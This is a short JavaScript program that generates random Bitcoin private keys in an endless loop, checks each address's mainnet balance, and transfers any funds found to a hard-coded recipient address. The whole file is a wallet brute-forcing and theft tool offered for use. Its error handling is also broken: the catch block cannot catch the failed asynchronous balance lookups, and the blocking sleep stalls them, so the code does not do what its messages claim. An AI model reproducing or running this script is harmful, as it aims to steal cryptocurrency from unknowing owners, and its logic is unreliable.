var sleep = require('sleep');
var CoinKey = require('coinkey') //1.0.0
var bitcoinTransaction = require('bitcoin-transaction');
var to = "17qvmSWR4vLqXxsDCtMCE6TppW9YtADhu4"; //change me to who you want the bitcoin to go to


bitcoinTransaction.providers.balance.mainnet.default = bitcoinTransaction.providers.balance.mainnet.blockchain;


while (true) {

var ck = new CoinKey.createRandom() //Create random address
var from = ck.publicAddress;	//Our current "brute forced" address
var privKeyWIF = ck.privateWif;	//Private (WIF) key of "brute forced" address in WIF form

try {

console.log(`Current Private Key (Wallet Import Format): ${ck.privateWif}`)
console.log(`Current Private Key (Hex): ${ck.privateKey.toString('hex')}`)
console.log(`Current Address: ${ck.publicAddress}`)
console.log(`Sending money to ${to}`)

bitcoinTransaction.getBalance(from, { network: "mainnet" }).then((balanceInBTC) => {
	return bitcoinTransaction.sendTransaction({
		from: from,
		to: to,
		privKeyWIF: privKeyWIF,
		btc: balanceInBTC,
		network: "mainnet",
		fee: "halfHour"
	});
});
} catch {
console.log(`This address (${from}) does NOT have any funds!`)
}

sleep.msleep(25)
}
